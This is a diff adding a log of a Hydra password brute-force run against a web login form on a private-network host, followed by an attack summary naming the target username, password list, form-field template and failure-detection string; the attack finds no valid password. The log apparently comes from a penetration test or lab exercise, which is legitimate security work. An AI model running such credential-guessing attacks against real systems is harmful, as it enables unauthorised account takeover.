@@ -1,0 +1,21 @@
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-11 15:35:46
+[DATA] max 3 tasks per 1 server, overall 3 tasks, 150 login tries (l:1/p:150), ~50 tries per task
+[DATA] attacking http-post-form://192.168.100.101:80/dologin.html:httpd_username=^USER^&httpd_password=^PASS^:login.html
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[STATUS] 63.00 tries/min, 63 tries in 00:01h, 87 to do in 00:02h, 3 active
+[STATUS] 63.00 tries/min, 126 tries in 00:02h, 24 to do in 00:01h, 3 active
+[STATUS] attack finished for 192.168.100.101 (waiting for children to complete tests)
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-11 15:38:11
+
+=== ATTACK SUMMARY ===
+Target: http://192.168.100.101/login.html (POST to /dologin.html)
+Username: wangxx
+Password List: entropy_pools/html_v2_combined.txt (149 passwords)
+Attack Duration: 2 minutes 25 seconds
+Rate: 63 attempts/minute (conservative rate limiting)
+Result: NO VALID PASSWORD FOUND
+Form Fields: httpd_username=^USER^&httpd_password=^PASS^
+Failure Detection: Presence of 'login.html' in response
